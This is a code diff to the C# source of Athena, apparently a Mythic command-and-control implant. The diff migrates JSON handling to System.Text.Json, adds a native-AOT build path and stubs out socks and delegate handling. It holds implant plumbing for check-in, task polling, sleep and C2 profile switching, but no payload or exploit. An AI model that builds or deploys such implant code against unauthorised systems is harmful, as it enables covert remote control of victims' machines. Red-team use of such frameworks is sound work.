@@ -1,4 +1,5 @@
-﻿using Athena.Commands;
+﻿#define NATIVEAOT
+using Athena.Commands;
 using Athena.Commands.Model;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
@@ -11,12 +12,14 @@ using System.Diagnostics;
 using System.Net;
 using System.Text;
 using System.Threading.Tasks;
-using Newtonsoft.Json;
 using Athena.Plugins;
 using Athena.Models;
 using System.Reflection;
 using Athena.Models.Config;
 using System.Linq;
+using System.Text.Json;
+using System.Text.Json.Serialization;
+using Athena.Forwarders;
 
 namespace Athena
 {
@@ -63,7 +66,6 @@ namespace Athena
             if(choice is null)
                 return availableProfiles.FirstOrDefault().Value;
 #endif
-            Console.WriteLine("choice: " + choice);
             if (String.IsNullOrEmpty(choice))
             {
                 Random rand = new Random(); //Select profile at random from available ones
@@ -73,13 +75,11 @@ namespace Athena
             {
                 if (this.availableProfiles.ContainsKey($"ATHENA.PROFILES.{choice.ToUpper()}"))
                 {
-                    Console.WriteLine("Switching profile to " + choice);
                     //Switch to the requested profile
                     return this.availableProfiles[$"ATHENA.PROFILES.{choice.ToUpper()}"];
                 }
                 else
                 {
-                    Console.WriteLine("Keeping original profile.");
                     //Don't make any changes
                     return this.currentConfig;
                 }
@@ -134,8 +134,11 @@ profiles.Add("Athena.Profiles.SMB");
 #endif
 #if DEBUG
             profiles.Add("Athena.Profiles.Slack");
-            //profiles.Add("Athena.Profiles.Debug2");
 #endif
+
+#if NATIVEAOT
+            configs.Add(profiles.FirstOrDefault().ToUpper(), new Config());
+#else
             foreach (var profile in profiles)
             {
                 try
@@ -150,7 +153,6 @@ profiles.Add("Athena.Profiles.SMB");
                     {
                         if (typeof(IConfig).IsAssignableFrom(t))
                         {
-                            Console.WriteLine("Added Config: " + profile);
                             configs.Add(profile.ToUpper(), (IConfig)Activator.CreateInstance(t));
                         }
                     }
@@ -160,7 +162,7 @@ profiles.Add("Athena.Profiles.SMB");
                     
                 }
             }
-            
+#endif
             return configs;
         }
         /// <summary>
@@ -177,8 +179,9 @@ profiles.Add("Athena.Forwarders.SMB");
 profiles.Add("Athena.Forwarders.Empty");
 #endif
 
-
-
+#if NATIVEAOT
+            forwarders.Add(profiles.FirstOrDefault().ToUpper(), new Forwarder());
+#else
             foreach (var profile in profiles)
             {
                 try
@@ -201,7 +204,8 @@ profiles.Add("Athena.Forwarders.Empty");
                 {
                     
                 }
-            }       
+            }
+#endif
             return forwarders;
         }
 
@@ -226,13 +230,14 @@ profiles.Add("Athena.Forwarders.Empty");
             };
             try
             {
-                var responseString = await this.currentConfig.profile.Send(ct);
+
+                var responseString = await this.currentConfig.profile.Send(JsonSerializer.Serialize(ct, CheckinJsonContext.Default.Checkin));
 
                 if (String.IsNullOrEmpty(responseString))
                 {
                     return null;
                 }
-                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
+                CheckinResponse cs = JsonSerializer.Deserialize(responseString, CheckinResponseJsonContext.Default.CheckinResponse);
                 if (cs is null)
                 {
                     cs = new CheckinResponse()
@@ -257,7 +262,7 @@ profiles.Add("Athena.Forwarders.Empty");
         //public async Task<List<MythicTask>> GetTasks(List<object> responses, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
         public async Task<List<MythicTask>> GetTasks()
         {
-            List<object> responses = await this.commandHandler.GetResponses();
+            List<ResponseResult> responses = await this.commandHandler.GetResponses();
             GetTasking gt = new GetTasking()
             {
                 action = "get_tasking",
@@ -269,7 +274,7 @@ profiles.Add("Athena.Forwarders.Empty");
             
             try
             {
-                string responseString = this.currentConfig.profile.Send(gt).Result;
+                string responseString = await this.currentConfig.profile.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
 
                 if (String.IsNullOrEmpty(responseString))
                 {
@@ -281,8 +286,66 @@ profiles.Add("Athena.Forwarders.Empty");
             }
             catch (Exception e)
             {
+                Console.WriteLine(e);
                 return null;
             }
+        }
+        /// <summary>
+        /// Parse the GetTaskingResponse and forward them to the required places
+        /// </summary>
+        /// <param name="responseString">Response from the Mythic server</param>
+        private async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
+        {
+            Console.WriteLine(responseString);
+            GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+            Console.WriteLine(gtr.tasks.Count);
+            if (gtr is null)
+            {
+                return null;
+            }
+
+            //Pass up socks messages
+            if (gtr.socks is not null && gtr.socks.Count > 0)
+            {
+                try
+                {
+                    //HandleSocks(gtr.socks);
+                }
+                catch (Exception e)
+                {
+
+                }
+            }
+
+            if (gtr.delegates is not null && gtr.delegates.Count > 0)
+            {
+                try
+                {
+                    //HandleDelegates(gtr.delegates);
+                }
+                catch (Exception e)
+                {
+
+                }
+            }
+            if (gtr.responses is not null)
+            {
+                try
+                {
+                    //HandleMythicResponses(gtr.responses);
+                }
+                catch (Exception e)
+                {
+                }
+            }
+            //List<MythicTask> tasks = new List<MythicTask>();
+            //foreach(string task in gtr.tasks)
+            //{
+            //    MythicTask t = JsonSerializer.Deserialize(task, MythicTaskJsonContext.Default.MythicTask);
+            //    tasks.Add(t);
+            //}
+
+            return gtr.tasks;
         }
         #endregion
         #region Helper Functions
@@ -299,7 +362,7 @@ profiles.Add("Athena.Forwarders.Empty");
                 completed = "true",
                 task_id = e.job.task.id
             };
-            var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(e.job.task.parameters);
+            var sleepInfo = JsonSerializer.Deserialize<Dictionary<string, string>>(e.job.task.parameters, JsonSerializerOptions.Default);
             try
             {
                 this.currentConfig.sleep = int.Parse((string)sleepInfo["sleep"]);
@@ -330,7 +393,7 @@ profiles.Add("Athena.Forwarders.Empty");
                 completed = "true",
                 task_id = e.job.task.id,
             };
-            var profileInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(e.job.task.parameters);
+            var profileInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(e.job.task.parameters);
             try
             {
                 this.currentConfig = SelectConfig((string)profileInfo["name"]);
@@ -358,7 +421,7 @@ profiles.Add("Athena.Forwarders.Empty");
                 completed = "true",
                 task_id = e.job.task.id,
             };
-            var profileInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(e.job.task.parameters);
+            var profileInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(e.job.task.parameters);
             try
             {
                 this.forwarder = SelectForwarder((string)profileInfo["profile"]);
@@ -474,54 +537,6 @@ profiles.Add("Athena.Forwarders.Empty");
                 task_id = e.job.task.id,
             });
             this.exit = true;
-        }
-        /// <summary>
-        /// Parse the GetTaskingResponse and forward them to the required places
-        /// </summary>
-        /// <param name="responseString">Response from the Mythic server</param>
-        private async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
-        {
-            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
-            if (gtr is null)
-            {
-                return null;
-            }
-
-            //Pass up socks messages
-            if (gtr.socks is not null && gtr.socks.Count > 0)
-            {
-                try
-                {
-                    HandleSocks(gtr.socks);
-                }
-                catch (Exception e)
-                {
-
-                }
-            }
-
-            if (gtr.delegates is not null && gtr.delegates.Count > 0)
-            {
-                try
-                {
-                    HandleDelegates(gtr.delegates);
-                }
-                catch (Exception e)
-                {
-
-                }
-            }
-            if (gtr.responses is not null)
-            {
-                try
-                {
-                    HandleMythicResponses(gtr.responses);
-                }
-                catch (Exception e)
-                {
-                }
-            }
-            return gtr.tasks;
         }
 
         /// <summary>
